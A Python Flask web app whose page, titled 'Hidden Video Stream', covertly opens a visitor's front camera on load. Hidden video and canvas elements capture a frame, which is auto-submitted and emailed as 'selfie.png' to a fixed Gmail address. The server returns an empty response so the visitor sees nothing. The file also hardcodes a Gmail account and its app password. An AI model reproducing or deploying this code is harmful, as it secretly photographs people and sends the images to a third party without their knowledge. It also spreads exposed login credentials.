from flask import Flask, request, render_template_string
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import base64
import re

app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Hidden Video Stream</title>
    </head>
    <body>
        <video id="video" width="640" height="480" autoplay style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>
        <form id="selfieForm" method="POST" action="/send_email">
            <input type="hidden" name="imageData" id="imageData">
        </form>
        <script>
            function getselfie() {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const imageDataInput = document.getElementById('imageData');
                const context = canvas.getContext('2d');
               
                const constraints = { 
                    video: { 
                        facingMode: 'user' 
                    } 
                };

                navigator.mediaDevices.getUserMedia(constraints)
                    .then((stream) => {
                        video.srcObject = stream;
                        video.addEventListener('loadeddata', () => {
                            const aspectRatio = video.videoWidth / video.videoHeight;
                            const newWidth = video.videoWidth;
                            const newHeight = newWidth / aspectRatio;

                            canvas.width = newWidth;
                            canvas.height = newHeight;

                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const dataUrl = canvas.toDataURL('image/png');
                            imageDataInput.value = dataUrl;

                            // フォームを自動送信
                            document.getElementById('selfieForm').submit();
                        });
                    })
                    .catch((err) => {
                        console.error('Error:', err);
                        alert(`Error: ${err.name} - ${err.message}`);
                    });
            }
            window.addEventListener('load', getselfie);
        </script>
    </body>
    </html>
    ''')

@app.route('/send_email', methods=['POST'])
def send_email():
    # Gmail settings
    GMAIL_ACCOUNT = "334.nyan.nyan@gmail.com"
    GMAIL_PASSWORD = "kwuuonmivthawiph"

    # Recipient email address
    TO_ADDR = "a14398138@gmail.com"

    # Get form data
    image_data = request.form['imageData']

    # Extract base64 data
    image_data = re.sub('^data:image/.+;base64,', '', image_data)
    image_data = base64.b64decode(image_data)

    # Email subject and body
    SUBJECT = "Today's Selfie"
    BODY = "Please find the attached selfie."

    # Create MIME message
    msg = MIMEMultipart()
    msg['Subject'] = SUBJECT
    msg['From'] = GMAIL_ACCOUNT
    msg['To'] = TO_ADDR

    # Attach the image
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(image_data)
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="selfie.png"')
    msg.attach(part)

    # Attach the body text
    msg.attach(MIMEText(BODY, 'plain'))

    # Connect to SMTP server and send email
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(GMAIL_ACCOUNT, GMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        return ""
    except Exception as e:
        return f"Failed to send email: {str(e)}"

if __name__ == '__main__':
    app.run(debug=True)